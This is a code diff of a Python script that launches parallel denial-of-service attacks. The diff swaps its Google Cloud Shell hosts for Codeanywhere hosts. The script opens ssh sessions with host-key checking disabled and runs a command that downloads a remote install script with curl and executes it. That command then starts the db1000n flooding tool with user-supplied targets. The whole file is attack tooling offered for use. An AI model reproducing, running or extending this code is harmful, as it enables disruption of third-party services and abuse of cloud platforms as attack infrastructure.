@@ -1,5 +1,5 @@
 """
-attacks with needles via gshells
+attacks with needles via codeanywhere
 
 """
 
@@ -13,16 +13,18 @@ import time
 
 logging.getLogger().setLevel(logging.INFO)
 
+CAW_KEYS_DIR = f'caw_keys{os.sep}'
+
 ATTACK_COMMAND = (
-    'gcloud cloud-shell ssh --authorize-session '
-    '--command="source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) '
-    '&& ./db1000n -enable-self-update -prometheus_on=false {}"'
+    'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{user}_{host}_{port} {user}@{host} -p {port} '
+    '-t "source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) '
+    '&& ./db1000n -enable-self-update -prometheus_on=false {needles_args}"'
 )
 
 
 class Attack:
     """
-    class to attack with needles via gshells
+    class to attack with needles via codeanywhere
 
     """
 
@@ -31,35 +33,25 @@ class Attack:
         self.shells_num = 0
         self.processes = []
 
-    def make_configurations(self, shells_num):
+    def make_hosts(self, shells_num):
         """
-        makes gcloud configurations
+        makes list of hosts
 
-        :param shells_num: a number of gshells
+        :param shells_num: a number of ssh connections
 
         """
-        process = subprocess.Popen(
-            shlex.split('gcloud config configurations list'),
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
-        )
-        configs = [
-            x for x in process.stdout.readlines()[1:] if not x.startswith(b'default')
-        ]
-        if configs:
-            configs = [
-                x.split()[0].decode() for x in configs
-            ]
-            logging.info('gcloud configurations: %s', ", ".join(configs))
+        configurations = next(os.walk(CAW_KEYS_DIR))[-1]
 
-            self.configurations = iter(configs)
-            self.shells_num = min(len(configs), shells_num)
+        if configurations:
+            logging.info('codeanywhere hosts: %s', ", ".join(configurations))
+            self.configurations = iter(configurations)
+            self.shells_num = min(len(configurations), shells_num)
         else:
-            logging.warning('there is no gcloud configuration')
+            logging.warning('there is no codeanywhere host')
 
     def make_process(self, needles_args):
         """
-        makes process with ssh connect to gshell and runs command
+        makes process with ssh connect and runs command
 
         :param needles_args: db1000n arguments
 
@@ -67,26 +59,29 @@ class Attack:
         configuration = next(self.configurations, None)
         if configuration:
             os.makedirs('logs', exist_ok=True)
-            with open(f'logs{os.sep}configuration_{configuration}.log', 'wb') as log:
+            user, host, port = configuration.split('_')
+            with open(f'logs{os.sep}codeanywhere_{configuration}.log', 'w') as log:
                 process = subprocess.Popen(
-                    shlex.split(ATTACK_COMMAND.format(needles_args)),
-                    env={
-                        **dict(os.environ),
-                        'CLOUDSDK_ACTIVE_CONFIG_NAME': configuration,
-                    },
+                    shlex.split(ATTACK_COMMAND.format(
+                        caw_keys_dir=CAW_KEYS_DIR,
+                        user=user,
+                        host=host,
+                        port=port,
+                        needles_args=needles_args
+                    )),
                     stdout=log,
                     stderr=log
                 )
                 logging.info(
-                    'gcloud configuration %s: attack started, pid %d',
-                    configuration,
+                    'codeanywhere host %s: attack started, pid %d',
+                    host,
                     process.pid
                 )
                 self.processes.append(process)
 
     def start(self, needles_args):
         """
-        starts attack with needles via gshells
+        starts attack with needles via codeanywhere
 
         :param needles_args: db1000n arguments
 
@@ -110,15 +105,15 @@ class Attack:
 
 def main():
     """
-    attacks with needles via gshells
+    attacks with needles via codeanywhere
 
     """
     parser = argparse.ArgumentParser(
-        description='auto-attack with needles via gshells in parallel',
+        description='auto-attack with needles via codeanywhere in parallel',
         formatter_class=argparse.ArgumentDefaultsHelpFormatter
     )
     parser.add_argument('--attack_time', type=int, default=1, help='minimum attack time in seconds')
-    parser.add_argument('--shells_num', type=int, default=4, help='number of gshells')
+    parser.add_argument('--shells_num', type=int, default=4, help='number of ssh connections')
     parser.add_argument('--needles_args', type=str, default='', help='db1000n arguments')
     args = parser.parse_args()
 
@@ -128,7 +123,7 @@ def main():
     try:
         logging.info('press ctrl+c to stop attack')
         while (time.time() - start_time) < args.attack_time:
-            attack.make_configurations(args.shells_num)
+            attack.make_hosts(args.shells_num)
             attack.start(args.needles_args)
 
     except KeyboardInterrupt:
